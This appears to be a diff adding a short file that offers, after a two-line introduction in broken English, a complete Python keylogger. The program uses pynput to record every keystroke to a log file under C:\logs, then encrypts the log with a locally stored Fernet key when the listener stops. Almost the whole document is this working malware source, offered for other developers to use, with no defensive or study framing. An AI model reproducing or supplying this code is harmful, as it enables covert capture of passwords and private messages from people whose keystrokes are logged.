@@ -1,0 +1,53 @@
+This is an another poet and its an easy version to understand for any of other developers
+about the key logger
+
+import pynput
+from pynput.keyboard import Key, Listener
+from cryptography.fernet import Fernet
+import logging
+import os
+
+# Directory setup for log files
+log_dir = r"C:\logs"
+if not os.path.exists(log_dir):
+    os.makedirs(log_dir)
+
+log_file = os.path.join(log_dir, "keylog.txt")
+encrypted_log_file = os.path.join(log_dir, "encrypted_keylog.txt")
+
+# Generate or load an encryption key
+key_file = os.path.join(log_dir, "encryptlog.key")
+if not os.path.exists(key_file):
+    key = Fernet.generate_key()
+    with open(key_file, 'wb') as key_out:
+        key_out.write(key)
+else:
+    with open(key_file, 'rb') as key_in:
+        key = key_in.read()
+
+# Initialize the encryption handler
+cipher = Fernet(key)
+
+# Logging setup
+logging.basicConfig(filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s")
+
+def encrypt_log(): 
+    with open(log_file, 'rb') as log:
+        data = log.read()
+        encrypted_data = cipher.encrypt(data)
+        with open(encrypted_log_file, 'wb') as encrypted_log:
+            encrypted_log.write(encrypted_data)
+
+def on_press(key):
+    logging.info(str(key))
+
+def main():
+    # Start keylogger listener
+    with Listener(on_press=on_press) as listener:
+        listener.join()
+    # Encrypt log when done
+    encrypt_log()
+
+if __name__ == "__main__":
+    main()
+ 
